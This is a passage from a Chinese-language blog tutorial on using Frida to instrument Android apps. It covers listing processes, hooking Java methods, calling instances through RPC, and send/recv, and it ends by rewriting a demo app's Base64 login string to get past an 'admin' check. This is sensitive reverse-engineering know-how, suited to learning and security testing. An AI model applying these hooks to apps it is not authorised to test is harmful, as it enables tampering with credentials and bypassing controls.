device8.spawn(<span class="string">"com.android.settings"</span>)</span><br><span class="line">device8.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device8.attach(pid)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"si.js"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line">input() <span class="comment">#等待输入</span></span><br></pre></td></tr></table></figure><p>解释一下，这个脚本就是先通过<code>frida.get_device_manager().add_remote_device</code>来找到device,然后spawn方式启动settings，然后attach到上面，并执行frida脚本。</p><h2 id="FRIDA基础"><a href="#FRIDA基础" class="headerlink" title="FRIDA基础"></a>FRIDA基础</h2><h3 id="frida查看当前存在的进程"><a href="#frida查看当前存在的进程" class="headerlink" title="frida查看当前存在的进程"></a>frida查看当前存在的进程</h3><p><code>frida-ps -U</code>查看通过usb连接的android手机上的进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ frida-ps --help</span><br><span class="line">Usage: frida-ps [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program&#39;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -D ID, --device&#x3D;ID    connect to device with the given ID</span><br><span class="line">  -U, --usb             connect to USB device</span><br><span class="line">  -R, --remote          connect to remote frida-server</span><br><span class="line">  -H HOST, --host&#x3D;HOST  connect to remote frida-server on HOST</span><br><span class="line">  -a, --applications    list only applications</span><br><span class="line">  -i, --installed       include all installed applications</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ frida-ps -U</span><br><span class="line">  PID  Name</span><br><span class="line">-----  ---------------------------------------------------</span><br><span class="line"> 3640  ATFWD-daemon</span><br><span class="line">  707  adbd</span><br><span class="line">  728  adsprpcd</span><br><span class="line">26041  android.hardware.audio@2.0-service</span><br><span class="line">  741  android.hardware.biometrics.fingerprint@</span><br></pre></td></tr></table></figure><p>通过grep过滤就可以找到我们想要的包名。</p><h3 id="frida打印参数和修改返回值"><a href="#frida打印参数和修改返回值" class="headerlink" title="frida打印参数和修改返回值"></a>frida打印参数和修改返回值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> myapplication.example.com.frida_demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String total = <span class="string">"@@@###@@@"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">            Log.d(<span class="string">"sakura.string"</span> , fun(<span class="string">"LoWeRcAsE Me!!!!!!!!!"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y )</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"sakura.Sum"</span> , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">fun</span><span class="params">(String x)</span></span>&#123;</span><br><span class="line">        total +=x;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">secret</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Enter the Script!"</span>);</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Inside Java perform"</span>);</span><br><span class="line">        <span class="keyword">var</span> MainActivity = Java.use(<span class="string">"myapplication.example.com.frida_demo.MainActivity"</span>);</span><br><span class="line">        <span class="comment">// 重载找到指定的函数</span></span><br><span class="line">        MainActivity.fun.overload(<span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//打印参数</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"original call : str:"</span> + str);</span><br><span class="line">            <span class="comment">//修改结果</span></span><br><span class="line">            <span class="keyword">var</span> ret_value = <span class="string">"sakura"</span>;</span><br><span class="line">            <span class="keyword">return</span> ret_value;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ frida-ps -U | grep frida</span><br><span class="line">8738  frida-helper-32</span><br><span class="line">8897  myapplication.example.com.frida_demo</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; -f是通过spawn，也就是重启apk注入js</span><br><span class="line">sakura@sakuradeMacBook-Pro:~$ frida -U -f myapplication.example.com.frida_demo -l frida_demo.js</span><br><span class="line">...</span><br><span class="line">original call : str:LoWeRcAsE Me!!!!!!!!!</span><br><span class="line">12-21 04:46:49.875 9594-9594&#x2F;myapplication.example.com.frida_demo D&#x2F;sakura.string: sakura</span><br></pre></td></tr></table></figure><h3 id="frida寻找instance，主动调用。"><a href="#frida寻找instance，主动调用。" class="headerlink" title="frida寻找instance，主动调用。"></a>frida寻找instance，主动调用。</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Enter the Script!"</span>);</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Inside Java perform"</span>);</span><br><span class="line">        <span class="keyword">var</span> MainActivity = Java.use(<span class="string">"myapplication.example.com.frida_demo.MainActivity"</span>);</span><br><span class="line">        <span class="comment">//overload 选择被重载的对象</span></span><br><span class="line">        MainActivity.fun.overload(<span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//打印参数</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"original call : str:"</span> + str);</span><br><span class="line">            <span class="comment">//修改结果</span></span><br><span class="line">            <span class="keyword">var</span> ret_value = <span class="string">"sakura"</span>;</span><br><span class="line">            <span class="keyword">return</span> ret_value;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 寻找类型为classname的实例</span></span><br><span class="line">        Java.choose(<span class="string">"myapplication.example.com.frida_demo.MainActivity"</span>, &#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"find instance :"</span> + x);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"result of secret func:"</span> + x.secret());</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><h3 id="frida-rpc"><a href="#frida-rpc" class="headerlink" title="frida rpc"></a>frida rpc</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callFun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"begin"</span>);</span><br><span class="line">        Java.choose(<span class="string">"myapplication.example.com.frida_demo.MainActivity"</span>, &#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"find instance :"</span> + x);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"result of fun(string) func:"</span> + x.fun(Java.use(<span class="string">"java.lang.String"</span>).$<span class="keyword">new</span>(<span class="string">"sakura"</span>)));</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">rpc.exports = &#123;</span><br><span class="line">    callfun: callFun</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">"myapplication.example.com.frida_demo"</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"frida_demo_rpc_call.js"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_handler</span><span class="params">(message, payload)</span>:</span></span><br><span class="line">    print(message)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">script.on(<span class="string">"message"</span>, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">script.exports.callfun()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;gitsource&#x2F;frida-agent-example&#x2F;agent$ python frida_demo_rpc_loader.py </span><br><span class="line">begin</span><br><span class="line">find instance :myapplication.example.com.frida_demo.MainActivity@1d4b09d</span><br><span class="line">result of fun(string):sakura</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="frida动态修改"><a href="#frida动态修改" class="headerlink" title="frida动态修改"></a>frida动态修改</h3><p>即将手机上的app的内容发送到PC上的frida python程序，然后处理后返回给app，然后app再做后续的流程，核心是理解<code>send/recv</code>函数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/textView"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"please input username and password"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintLeft_toLeftOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintRight_toRightOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/editText"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"fill_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"40dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">"username"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:maxLength</span>=<span class="string">"20"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintVertical_bias</span>=<span class="string">"0.095"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/editText2"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"fill_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"40dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">"password"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:maxLength</span>=<span class="string">"20"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintVertical_bias</span>=<span class="string">"0.239"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"100dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"35dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">"right|center_horizontal"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"提交"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:visibility</span>=<span class="string">"visible"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintVertical_bias</span>=<span class="string">"0.745"</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    EditText username_et;</span><br><span class="line">    EditText password_et;</span><br><span class="line">    TextView message_tv;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        password_et = (EditText) <span class="keyword">this</span>.findViewById(R.id.editText2);</span><br><span class="line">        username_et = (EditText) <span class="keyword">this</span>.findViewById(R.id.editText);</span><br><span class="line">        message_tv = ((TextView) findViewById(R.id.textView));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.findViewById(R.id.button).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (username_et.getText().toString().compareTo(<span class="string">"admin"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                    message_tv.setText(<span class="string">"You cannot login as admin"</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//hook target</span></span><br><span class="line">                message_tv.setText(<span class="string">"Sending to the server :"</span> + Base64.encodeToString((username_et.getText().toString() + <span class="string">":"</span> + password_et.getText().toString()).getBytes(), Base64.DEFAULT));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先分析问题，我的最终目标是让message_tv.setText可以”发送”username为admin的base64字符串。<br>那肯定是hook TextView.setText这个函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"Script loaded successfully "</span>);</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> tv_class = Java.use(<span class="string">"android.widget.TextView"</span>);</span><br><span class="line">    tv_class.setText.overload(<span class="string">"java.lang.CharSequence"</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> string_to_send = x.toString();</span><br><span class="line">        <span class="keyword">var</span> string_to_recv;</span><br><span class="line">        send(string_to_send); <span class="comment">// send data to python code</span></span><br><span class="line">        recv(<span class="function"><span class="keyword">function</span> (<span class="params">received_json_object</span>) </span>&#123;</span><br><span class="line">            string_to_recv = received_json_object.my_data</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"string_to_recv: "</span> + string_to_recv);</span><br><span class="line">        &#125;).wait(); <span class="comment">//block execution till the message is received</span></span><br><span class="line">        <span class="keyword">var</span> my_string = Java.use(<span class="string">"java.lang.String"</span>).$<span class="keyword">new</span>(string_to_recv);</span><br><span class="line">        <span class="keyword">this</span>.setText(my_string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_handler</span><span class="params">(message, payload)</span>:</span></span><br><span class="line">    print(message)</span><br><span class="line">    print(payload)</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">"type"</span>] == <span class="string">"send"</span>:</span><br><span class="line">        print(message[<span class="string">"payload"</span>])</span><br><span class="line">        data = message[<span class="string">"payload"</span>].split(<span class="string">":"</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        print( <span class="string">'message:'</span>, message)</span><br><span class="line">        <span class="comment">#data = data.decode("base64")</span></span><br><span class="line">        <span class="comment">#data = data</span></span><br><span class="line">        data = str(base64.b64decode(data))</span><br><span class="line">        print( <span class="string">'data:'</span>,data)</span><br><span class="line">        user, pw = data.split(<span class="string">":"</span>)</span><br><span class="line">        print( <span class="string">'pw:'</span>,pw)</span><br><span class="line">        <span class="comment">#data = ("admin" + ":" + pw).encode("base64")</span></span><br><span class="line">        data = str(base64.b64encode((<span class="string">"admin"</span> + <span class="string">":"</span> + pw).encode()))</span><br><span class="line">        print( <span class="string">"encoded data:"</span>, data)</span><br><span class="line">        script.post(&#123;<span class="string">"my_data"</span>: data&#125;)  <span class="comment"># send JSON object</span></span><br><span class="line">        print( <span class="string">"Modified data sent"</span>)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">"myapplication.example.com.frida_demo"</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"frida_demo2.js"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">"message"</span>, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line">input()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;gitsource&#x2F;frida-agent-example&#x2F;agent$ python frida_demo_rpc_loader2.py </span><br><span class="line">Script loaded successfully </span><br><span class="line">&#123;&#39;type&#39;: &#39;send&#39;, &#39;payload&#39;: &#39;Sending to the server :c2FrdXJhOjEyMzQ1Ng&#x3D;&#x3D;\n&#39;&#125;</span><br><span class="line">None</span><br><span class="line">Sending to the server :c2FrdXJhOjEyMzQ1Ng&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">message: &#123;&#39;type&#39;: &#39;send&#39;, &#39;payload&#39;: &#39;Sending to the server :c2FrdXJhOjEyMzQ1Ng&#x3D;&#x3D;\n&#39;&#125;</span><br><span class="line">data: 